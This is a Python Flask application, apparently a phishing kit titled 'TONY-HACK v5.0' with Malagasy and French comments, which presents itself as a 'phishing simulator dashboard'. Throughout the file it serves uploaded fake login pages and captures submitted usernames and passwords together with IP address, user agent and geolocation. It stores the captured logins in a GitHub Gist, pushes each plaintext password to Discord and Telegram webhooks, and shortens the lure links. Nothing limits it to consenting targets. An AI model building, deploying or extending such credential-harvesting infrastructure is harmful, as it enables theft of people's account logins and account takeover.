#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║                    🔴 TONY-HACK v5.0                         ║
║                 PHISHING SIMULATOR DASHBOARD                 ║
║                    WRITTEN BY TONY                           ║
╚══════════════════════════════════════════════════════════════╝
"""

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory, Response
from datetime import datetime
import os
import uuid
import json
import base64
import requests
import re
import time

# =====================================================
# CONFIGURATION
# =====================================================

ADMIN_USER = "admin"
ADMIN_PASS = "admin123"
ACCESS_CODE = "TONY2026"

# GitHub Gist Persistance
GIST_ID = "a08b5882fbe8fa95c1e8cb9230e53626"  # ⚠️ SOLOY AMIN'NY GIST ID-NAO
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')

# Cache local
data_store = {'templates': [], 'credentials': [], 'settings': {}}

# =====================================================
# GITHUB GIST PERSISTANCE
# =====================================================

def load_from_gist():
    """Maka données avy amin'ny Gist"""
    if not GITHUB_TOKEN or GIST_ID == "TON_GIST_ID":
        return None
    try:
        url = f"https://api.github.com/gists/{GIST_ID}"
        headers = {'Authorization': f'token {GITHUB_TOKEN}'}
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            gist = r.json()
            for filename in gist['files']:
                if filename.endswith('.json'):
                    content = gist['files'][filename].get('content', '{}')
                    return json.loads(content)
        return None
    except Exception as e:
        print(f"[GIST] Erreur load: {e}")
        return None

def save_to_gist(data):
    """Mampakatra données any amin'ny Gist"""
    if not GITHUB_TOKEN or GIST_ID == "TON_GIST_ID":
        print("[GIST] Token na GIST ID tsy voaconfiguré")
        return False
    try:
        url = f"https://api.github.com/gists/{GIST_ID}"
        headers = {'Authorization': f'token {GITHUB_TOKEN}'}
        payload = {'files': {'data.json': {'content': json.dumps(data, indent=2)}}}
        r = requests.patch(url, json=payload, headers=headers, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(f"[GIST] Erreur save: {e}")
        return False

def sync_data():
    """Mampifanaraka ny données"""
    global data_store
    remote = load_from_gist()
    if remote:
        remote_templates = {t['id']: t for t in remote.get('templates', [])}
        local_templates = {t['id']: t for t in data_store.get('templates', [])}
        remote_templates.update(local_templates)
        data_store['templates'] = list(remote_templates.values())
        
        remote_creds = remote.get('credentials', [])
        local_creds = data_store.get('credentials', [])
        remote_ids = {c['id'] for c in remote_creds}
        for c in local_creds:
            if c['id'] not in remote_ids:
                remote_creds.append(c)
        data_store['credentials'] = remote_creds
        data_store['settings'] = remote.get('settings', {})
        save_to_gist(data_store)

sync_data()

# =====================================================
# GÉOLOCALISATION
# =====================================================

class GeoLocator:
    def __init__(self):
        self.cache = {}
    def locate(self, ip):
        if ip in self.cache: return self.cache[ip]
        if ip in ['127.0.0.1', '::1'] or ip.startswith(('192.168.', '10.', '172.')):
            data = {'country': 'Local', 'country_code': '🏠', 'city': 'Local'}
        else:
            try:
                r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
                d = r.json()
                data = {'country': d.get('country', 'Unknown'), 'country_code': d.get('countryCode', '🌍'), 'city': d.get('city', 'Unknown')} if d.get('status') == 'success' else {'country': 'Unknown', 'country_code': '🌍', 'city': 'Unknown'}
            except:
                data = {'country': 'Unknown', 'country_code': '🌍', 'city': 'Unknown'}
        self.cache[ip] = data
        return data
    def format_location(self, data):
        flag = data.get('country_code', '🌍')
        return f"{flag} {data['city']}, {data['country']}" if data.get('city') != 'Unknown' else f"{flag} {data['country']}"

geo_locator = GeoLocator()

# =====================================================
# WEBHOOK MANAGER (SIMPLE)
# =====================================================

class WebhookManager:
    def __init__(self):
        self.webhooks = {'discord': [], 'telegram': []}
        self.load()
    def load(self):
        self.webhooks = data_store.get('settings', {}).get('webhooks', {'discord': [], 'telegram': []})
    def save(self):
        if 'settings' not in data_store: data_store['settings'] = {}
        data_store['settings']['webhooks'] = self.webhooks
        save_to_gist(data_store)
    def add_discord(self, url, name="Discord"):
        self.webhooks['discord'].append({'url': url, 'name': name, 'active': True})
        self.save()
    def add_telegram(self, token, chat_id, name="Telegram"):
        self.webhooks['telegram'].append({'token': token, 'chat_id': chat_id, 'name': name, 'active': True})
        self.save()
    def remove(self, service, index):
        if index < len(self.webhooks[service]): del self.webhooks[service][index]; self.save()
    def toggle(self, service, index):
        if index < len(self.webhooks[service]): self.webhooks[service][index]['active'] = not self.webhooks[service][index].get('active', True); self.save()
    def send_discord(self, url, title, desc, fields=None):
        try:
            embed = {"title": title, "description": desc, "color": 0xe94560}
            if fields: embed["fields"] = fields
            r = requests.post(url, json={"embeds": [embed]}, timeout=5)
            return r.status_code == 204
        except: return False
    def send_telegram(self, token, chat_id, msg):
        try:
            r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"}, timeout=5)
            return r.json().get('ok', False)
        except: return False
    def notify(self, template, username, password, ip, location="🌍 Unknown"):
        for w in self.webhooks['discord']:
            if w.get('active', True):
                self.send_discord(w['url'], "🔑 CREDENTIAL CAPTURÉ!", f"**{username}** sur **{template}**", fields=[{"name": "📧 Username", "value": username, "inline": True}, {"name": "🔐 Password", "value": f"||{password}||", "inline": True}, {"name": "🌐 IP", "value": ip, "inline": True}, {"name": "📍 Location", "value": location, "inline": True}])
        for w in self.webhooks['telegram']:
            if w.get('active', True):
                self.send_telegram(w['token'], w['chat_id'], f"🔥 <b>NOUVEAU CREDENTIAL!</b>\n\n📧 {username}\n🔐 <code>{password}</code>\n🌐 {ip}\n📍 {location}\n🎯 {template}")
    def get_all(self): return self.webhooks

webhook_manager = WebhookManager()

# =====================================================
# FLASK
# =====================================================

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'tony-hack-secret')

@app.route('/')
def index():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u = request.form.get('username')
        p = request.form.get('password')
        c = request.form.get('access_code')
        if u == ADMIN_USER and p == ADMIN_PASS and c == ACCESS_CODE:
            session['user'] = u
            return jsonify({'success': True, 'redirect': '/'})
        return jsonify({'success': False, 'message': 'Identifiants invalides'})
    return render_template('auth/login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/campaigns')
def campaigns():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/campaigns.html')

@app.route('/templates')
def templates():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/templates.html')

@app.route('/logs')
def logs():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/logs.html')

@app.route('/settings')
def settings():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/settings.html')

@app.route('/profile')
def profile():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('auth/profile.html')

@app.route('/builder')
def builder():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/builder.html')

@app.route('/statistics')
def statistics():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/statistics.html')

# =====================================================
# API PUBLIC URL & SHORTENER
# =====================================================

@app.route('/api/public-url')
def api_public_url():
    return jsonify({'url': request.host_url.rstrip('/')})

@app.route('/api/shorten')
def shorten_url():
    url = request.args.get('url', '')
    try:
        r = requests.get(f'https://tinyurl.com/api-create.php?url={url}', timeout=5)
        return jsonify({'short_url': r.text.strip()})
    except:
        return jsonify({'short_url': url})

# =====================================================
# API TEMPLATES
# =====================================================

@app.route('/api/templates/list')
def api_templates_list():
    templates = data_store.get('templates', [])
    base_url = request.host_url.rstrip('/')
    for t in templates:
        t['url'] = f"{base_url}/t/{t['id']}"
    return jsonify([t for t in templates if t.get('active', True)])

@app.route('/api/templates/upload', methods=['POST'])
def upload_template():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    f = request.files.get('file')
    if not f or not f.filename.endswith('.html'): return jsonify({'error': 'HTML requis'}), 400
    
    tid = str(uuid.uuid4())[:8]
    html_content = f.read().decode('utf-8')
    name = request.form.get('name', 'Template')
    ttype = request.form.get('type', 'custom')
    color = request.form.get('color', '#e94560')
    
    template = {'id': tid, 'name': name, 'type': ttype, 'color': color, 'active': True, 'html_content': html_content}
    if 'templates' not in data_store: data_store['templates'] = []
    data_store['templates'].append(template)
    save_to_gist(data_store)
    
    return jsonify({'success': True, 'template_id': tid, 'url': f"{request.host_url.rstrip('/')}/t/{tid}"})

@app.route('/api/templates/<tid>/update', methods=['POST'])
def update_template(tid):
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    d = request.get_json() or {}
    for t in data_store.get('templates', []):
        if t['id'] == tid:
            if d.get('name'): t['name'] = d['name']
            if d.get('type'): t['type'] = d['type']
            if d.get('color'): t['color'] = d['color']
            save_to_gist(data_store)
            return jsonify({'success': True})
    return jsonify({'error': 'Introuvable'}), 404

@app.route('/api/templates/<tid>/toggle', methods=['POST'])
def toggle_template(tid):
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    for t in data_store.get('templates', []):
        if t['id'] == tid:
            t['active'] = not t.get('active', True)
            save_to_gist(data_store)
            return jsonify({'success': True})
    return jsonify({'error': 'Introuvable'}), 404

@app.route('/api/templates/<tid>', methods=['DELETE'])
def delete_template(tid):
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    data_store['templates'] = [t for t in data_store.get('templates', []) if t['id'] != tid]
    save_to_gist(data_store)
    return jsonify({'success': True})

@app.route('/t/<tid>')
def serve_template(tid):
    for t in data_store.get('templates', []):
        if t['id'] == tid:
            if not t.get('active', True): return "Template désactivé", 403
            return t['html_content']
    return "Template introuvable", 404

# =====================================================
# API BUILDER
# =====================================================

@app.route('/api/builder/save', methods=['POST'])
def save_builder_template():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    d = request.get_json() or {}
    tid = str(uuid.uuid4())[:8]
    template = {'id': tid, 'name': d.get('name', 'Template Builder'), 'type': 'custom', 'color': '#e94560', 'active': True, 'html_content': d.get('html', '')}
    if 'templates' not in data_store: data_store['templates'] = []
    data_store['templates'].append(template)
    save_to_gist(data_store)
    return jsonify({'success': True, 'template_id': tid, 'url': f"{request.host_url.rstrip('/')}/t/{tid}"})

# =====================================================
# API CAPTURE & LOGS
# =====================================================

@app.route('/api/capture', methods=['POST'])
def capture():
    d = request.get_json() if request.is_json else request.form.to_dict()
    ip = request.remote_addr
    ua = request.user_agent.string
    ref = request.args.get('ref', '')
    target = ''
    if ref:
        try: target = base64.b64decode(ref).decode('utf-8')
        except: target = ref
    
    cred = {
        'id': str(uuid.uuid4())[:8],
        'template_id': d.get('template_id', 'unknown'),
        'username': d.get('email') or d.get('username') or '',
        'password': d.get('pass') or d.get('password') or '',
        'ip': ip, 'user_agent': ua, 'target': target,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    if 'credentials' not in data_store: data_store['credentials'] = []
    data_store['credentials'].append(cred)
    save_to_gist(data_store)
    
    try:
        loc = geo_locator.locate(ip)
        location = geo_locator.format_location(loc)
        for t in data_store.get('templates', []):
            if t['id'] == cred['template_id']:
                webhook_manager.notify(t.get('name', cred['template_id']), cred['username'], cred['password'], ip, location)
                break
    except: pass
    
    return jsonify({'success': True})

@app.route('/api/logs/list')
def api_logs_list():
    logs = data_store.get('credentials', [])
    for log in logs:
        try:
            loc = geo_locator.locate(log['ip'])
            log['location'] = geo_locator.format_location(loc)
        except: log['location'] = '🌍 Unknown'
        for t in data_store.get('templates', []):
            if t['id'] == log['template_id']:
                log['template_name'] = t.get('name', log['template_id'])
                break
        else: log['template_name'] = log['template_id']
    return jsonify(sorted(logs, key=lambda x: x['timestamp'], reverse=True))

@app.route('/api/logs/clear', methods=['POST'])
def clear_logs():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    data_store['credentials'] = []
    save_to_gist(data_store)
    return jsonify({'success': True})

@app.route('/api/logs/export/pdf')
def export_logs_pdf():
    if 'user' not in session: return redirect(url_for('login'))
    logs = data_store.get('credentials', [])
    txt = "TONY-HACK - RAPPORT\n" + "="*50 + "\n"
    for c in logs[:100]: txt += f"{c['username']} | {c['ip']} | {c['timestamp']}\n"
    return Response(txt, mimetype="text/plain", headers={"Content-disposition": "attachment; filename=rapport.txt"})

# =====================================================
# API STATISTIQUES AVANCÉES
# =====================================================

@app.route('/api/statistics/advanced')
def api_statistics_advanced():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    creds = data_store.get('credentials', [])
    countries = {}
    browsers = {}
    os_data = {}
    hourly = {str(h).zfill(2): 0 for h in range(24)}
    
    for c in creds:
        ip = c['ip']
        if ip and ip != '127.0.0.1':
            loc = geo_locator.locate(ip)
            country = loc.get('country', 'Unknown')
            countries[country] = countries.get(country, 0) + 1
        ua = c.get('user_agent', '')
        if ua:
            if 'Chrome' in ua and 'Edg' not in ua: browser = 'Chrome'
            elif 'Firefox' in ua: browser = 'Firefox'
            elif 'Safari' in ua and 'Chrome' not in ua: browser = 'Safari'
            elif 'Edg' in ua: browser = 'Edge'
            else: browser = 'Autre'
            browsers[browser] = browsers.get(browser, 0) + 1
            if 'Windows' in ua: os_name = 'Windows'
            elif 'Mac' in ua: os_name = 'macOS'
            elif 'Android' in ua: os_name = 'Android'
            elif 'iPhone' in ua or 'iPad' in ua: os_name = 'iOS'
            else: os_name = 'Autre'
            os_data[os_name] = os_data.get(os_name, 0) + 1
        ts = c.get('timestamp')
        if ts:
            try: hourly[ts.split(' ')[1].split(':')[0]] += 1
            except: pass
    
    sorted_countries = sorted(countries.items(), key=lambda x: x[1], reverse=True)[:10]
    return jsonify({
        'countries': [{'name': c[0], 'count': c[1]} for c in sorted_countries],
        'browsers': [{'name': b, 'count': c} for b, c in browsers.items()],
        'os': [{'name': o, 'count': c} for o, c in os_data.items()],
        'hourly': {'labels': [f"{h}h" for h in range(24)], 'data': [hourly[str(h).zfill(2)] for h in range(24)]},
        'total': len(creds)
    })

# =====================================================
# API STATS & PROFILE & WEBHOOKS & SETTINGS
# =====================================================

@app.route('/api/stats')
def api_stats():
    return jsonify({'templates': len(data_store.get('templates', [])), 'credentials': len(data_store.get('credentials', []))})

@app.route('/api/profile')
def api_profile():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    return jsonify({'username': session.get('user'), 'role': 'Super Admin'})

@app.route('/api/webhooks', methods=['GET'])
def api_get_webhooks():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    return jsonify(webhook_manager.get_all())

@app.route('/api/webhooks/discord', methods=['POST'])
def api_add_discord():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    d = request.get_json() or {}
    if d.get('url'): webhook_manager.add_discord(d['url'], d.get('name', 'Discord')); return jsonify({'success': True})
    return jsonify({'error': 'URL requise'}), 400

@app.route('/api/webhooks/telegram', methods=['POST'])
def api_add_telegram():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    d = request.get_json() or {}
    if d.get('token') and d.get('chat_id'): webhook_manager.add_telegram(d['token'], d['chat_id'], d.get('name', 'Telegram')); return jsonify({'success': True})
    return jsonify({'error': 'Token sy Chat ID ilaina'}), 400

@app.route('/api/webhooks/<service>/<int:index>', methods=['DELETE'])
def api_remove_webhook(service, index):
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    webhook_manager.remove(service, index); return jsonify({'success': True})

@app.route('/api/webhooks/<service>/<int:index>/toggle', methods=['POST'])
def api_toggle_webhook(service, index):
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    webhook_manager.toggle(service, index); return jsonify({'success': True})

@app.route('/api/webhooks/test', methods=['POST'])
def api_test_webhook():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    d = request.get_json() or {}; s = d.get('service')
    if s == 'discord': ok = webhook_manager.send_discord(d.get('url'), "🧪 Test", "✅ Webhook Discord mandeha!")
    elif s == 'telegram': ok = webhook_manager.send_telegram(d.get('token'), d.get('chat_id'), "🧪 <b>Test</b>\n\n✅ Webhook Telegram mandeha!")
    else: return jsonify({'error': 'Service invalide'}), 400
    return jsonify({'success': ok})

@app.route('/api/settings', methods=['POST'])
def save_settings():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    d = request.get_json() or {}
    if 'settings' not in data_store: data_store['settings'] = {}
    data_store['settings'].update(d)
    save_to_gist(data_store)
    return jsonify({'success': True})

# =====================================================
# DÉMARRAGE
# =====================================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"\n🔴 TONY-HACK v5.0 - GITHUB GIST FULL")
    app.run(host='0.0.0.0', port=port, debug=False)
